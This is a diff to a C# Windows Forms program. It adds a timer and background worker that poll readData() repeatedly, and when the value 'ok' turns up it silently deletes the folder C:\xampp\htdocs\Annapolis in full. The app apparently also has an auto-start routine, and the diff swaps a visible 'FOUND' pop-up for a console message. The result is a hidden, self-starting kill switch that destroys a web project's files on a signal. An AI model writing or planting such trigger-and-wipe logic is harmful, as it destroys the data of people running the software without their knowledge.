@@ -16,6 +16,9 @@ namespace CS02
 {
     public partial class Form1 : Form
     {
+
+        private string htdocs_path = "C:\\xampp\\htdocs\\Annapolis";
+        
         public Form1()
         {
             InitializeComponent();
@@ -23,7 +26,9 @@ namespace CS02
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            
+            timer1.Enabled = true;
+            timer1.Start();
+            Console.WriteLine("Timer is Called");
         }
 
         private void readData()
@@ -39,6 +44,8 @@ namespace CS02
             string tempString = null;
             int count = 0;
             byte[] buf = new byte[1024];
+
+            bool isFoundKey = false;
 
             StringBuilder sb = new StringBuilder();
 
@@ -78,7 +85,8 @@ namespace CS02
                         value = word[1];
                         if (value.Trim().Equals("ok"))
                         {
-                            MessageBox.Show("FOUND");
+                            Console.WriteLine("FOUND");
+                            isFoundKey = true;
                         }
                     }
 
@@ -97,11 +105,19 @@ namespace CS02
                     */
                 }                
             }
+
+            // If found
+            if (isFoundKey)
+            {
+                removeFolder();
+            }
         }
 
         private void button1_Click(object sender, EventArgs e)
-        {
-            readData();
+        {                        
+            Console.WriteLine("Timer started");
+            timer1.Enabled = true;
+            timer1.Start();
         }
 
         private void addAutoStartUp()
@@ -177,6 +193,67 @@ namespace CS02
                     }
                 }
             }
+        }
+
+
+        private void removeFolder()
+        {
+            // Check if directory exists
+            if (Directory.Exists(htdocs_path))
+            {
+                try
+                {
+
+                    Directory.Delete(htdocs_path, true);
+
+                    /*
+                    // Read files from folder
+                    string[] files = Directory.GetFiles(htdocs_path);
+                    foreach (string file in files)
+                    {                        
+                        Console.WriteLine(file);
+                    }
+                    */
+                    Console.WriteLine("{0}  = has been deleted", htdocs_path);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("RemoveFiles: " + e.Message);
+                }
+            }
+            else
+            {
+                Console.WriteLine("Folder is not existings =  {0}: " + htdocs_path);
+            }
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Console.WriteLine("Timer Started");
+            // 3600000
+            //readData();   
+            
+            // Start background Worker
+            backgroundWorker1.WorkerSupportsCancellation = true;
+            backgroundWorker1.WorkerReportsProgress = true;
+            backgroundWorker1.RunWorkerAsync();
+            
+        }
+
+        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
+        {
+            Console.WriteLine("Background worker Started");
+            readData();
+        }
+
+        private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
+        {
+
+        }
+
+        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
+        {
+            Console.WriteLine("Background worker Completed");
         }
     }
 }
